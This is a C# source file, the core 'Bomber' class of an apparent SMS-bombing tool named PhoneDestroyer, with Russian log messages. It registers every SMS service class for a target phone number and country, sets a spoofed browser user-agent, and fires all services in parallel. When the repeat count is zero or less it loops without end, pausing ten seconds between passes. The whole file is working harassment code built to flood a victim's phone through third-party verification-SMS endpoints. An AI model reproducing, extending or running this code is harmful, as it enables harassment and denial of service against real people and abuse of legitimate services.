using PhoneDestroyer.Services;
using PhoneDestroyer.Utility;
using System.Reflection;

internal class Bomber
{
    private string _phoneNumber;
    private string _country;
    private int _repeatCount;
    private readonly bool _showDebug;
    private List<Service> _services;
    public Bomber(string phoneNumber, string country, int repeatCount, bool showDebug)
    {
        _phoneNumber = phoneNumber;
        _country = country;
        _repeatCount = repeatCount;
        _showDebug = showDebug;
    }
    public void InitializeServices()
    {
        var code = (CountryCodes)Enum.Parse(typeof(CountryCodes), _country);
        var asm = Assembly.GetExecutingAssembly();
        var services = asm.GetTypes().Where(x => x.BaseType == typeof(Service)).ToList();
        _services = new();
        var client = new HttpClient();
        client.DefaultRequestHeaders.TryAddWithoutValidation("user-agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4698.139 Safari/537.36");
        foreach (var service in services)
        {
            var newService = (Service)Activator.CreateInstance(service);
            if (newService.AvailableFor.HasFlag(CountryCodes.Any) || newService.AvailableFor.HasFlag(code))
            {
                newService.PhoneNumber = _phoneNumber;
                newService.CountryCode = code;
                newService.Client = client;
                newService.LogDebug = _showDebug;
                _services.Add(newService);
            }
            else
            {
                Logger.LogWarning($"{newService.Name} пропущен, т.к не доступен в стране {code}");
            }
        }
    }

    public async Task RunAsync()
    {
        if (_services == null)
        {
            Logger.LogError("Services is not initialized");
            Environment.Exit(-1);
            return;
        }
        if (_repeatCount <= 0)
            _repeatCount = int.MaxValue;
        for (int i = 0; i < _repeatCount; i++)
        {
            await Parallel.ForEachAsync(_services, async (service, _) =>
            {
                try
                {
                    if (!service.AvailableFor.HasFlag(service.CountryCode))
                    {
                        Logger.LogWarning($"Сервис {service.Name} не доступен для страны {service.CountryCode}");
                        return;
                    }
                    if (!service.CanExecute)
                    {
                        Logger.LogInformation($"Сервис {service.Name} пропущен. Следующее выполнение возможно через {service.NextExecutionAvailableIn} секунд");
                        return;
                    }
                    if (await service.SendSmsAsync())
                        Logger.LogInformation($"Отправлено [SERVICE: {service.Name}]");
                    else
                        Logger.LogWarning($"Не удалось отправить [SERVICE: {service.Name}]");
                }
                catch (Exception ex)
                {
                    Logger.LogError($"Исключение: [SERVICE: {service.Name}]\n{ex.Message}");
                }
            });
            Logger.LogInformation($"Проход {i} завершён. Ждём 10 секунд");
            await Task.Delay(10000);

        }
    }
}